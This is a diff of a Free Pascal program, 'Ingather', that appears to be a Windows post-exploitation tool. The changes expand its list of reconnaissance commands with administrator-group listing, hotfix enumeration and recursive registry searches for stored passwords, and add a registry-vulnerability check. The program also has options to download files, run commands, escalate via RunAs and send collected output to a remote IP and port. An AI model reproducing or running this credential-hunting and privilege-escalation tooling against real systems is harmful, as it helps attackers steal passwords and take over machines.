@@ -8,7 +8,7 @@ program Ingather;
 {$mode objfpc}{$H+}
 
 uses
-  Classes, SysUtils, CustApp, WinUsers, RunAs, NetIO, FindVulns, RunCMD, WinReg, registry
+  Classes, SysUtils, CustApp, WinUsers, RunAs, NetIO, FindVulns, RunCMD
   { you can add units after this };
 
 type
@@ -28,25 +28,23 @@ type
 
 procedure TIngather.DoRun;
 const
-  NUM_CMDS = 13;
-  CMD      : array[1..NUM_CMDS] of string = ('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"','whoami /all','net users','ipconfig /all','route print','netstat -ano','netsh firewall show state','netsh firewall show config','arp -a','wmic service get Name,PathName,Started,StartMode,StartName,Status','schtasks /query /fo LIST /v','tasklist /SVC','driverquery /v');
+  NUM_CMDS        = 17;
+  CMD             : array[1..NUM_CMDS] of string = ('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"','whoami /all','net users','net localgroup administrators','ipconfig /all','route print','netstat -ano','netsh firewall show state','netsh firewall show config','arp -a','wmic service get Name,PathName,Started,StartMode,StartName,Status','schtasks /query /fo LIST /v','tasklist /SVC', 'wmic qfe get HotFixID', 'driverquery /v', 'reg query HKLM /f password /t REG_SZ /s', 'reg query HKCU /f password /t REG_SZ /s');
 var
-  ErrorMsg     : String;
-  ip           : AnsiString;
-  port         : AnsiString;
-  outfile      : AnsiString;
-  nwrk         : TNetIO;
-  escalate     : TRunAs;
-  vulns        : TFindVulns;
-  execute      : TRunCMD;
-  x            : Integer;
-  output       : AnsiString = '';
-  tfOut        : TextFile;
-  download     : String;
-  save         : String;
-  command      : String;
-  readReg      : TWinReg;
-  UAC          : LongInt;
+  ErrorMsg        : String;
+  ip              : AnsiString;
+  port            : AnsiString;
+  outfile         : AnsiString;
+  nwrk            : TNetIO;
+  escalate        : TRunAs;
+  vulns           : TFindVulns;
+  execute         : TRunCMD;
+  x               : Integer;
+  output          : AnsiString = '';
+  tfOut           : TextFile;
+  download        : String;
+  save            : String;
+  command         : String;
 begin
   // quick check parameters
   ErrorMsg:= CheckOptions('cdehiposxz','command download enum help ip out port save');
@@ -95,6 +93,7 @@ begin
       end else begin
         vulns:= TFindVulns.Create;
         vulns.getVulnServices;
+        vulns.getRegVulns;
         vulns.Free;
       end;
     end else
@@ -107,11 +106,6 @@ begin
         Terminate;
         Exit;
       end;
-
-    readReg:= TWinReg.Create;
-    UAC:= readReg.ReadKey(HKEY_LOCAL_MACHINE, '\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 'EnableLUA');
-    if UAC = 1 then
-      writeln('UAC is enabled!!!');
 
     // Send output to another computer?
     if HasOption('i','ip') and HasOption('p','port') then begin
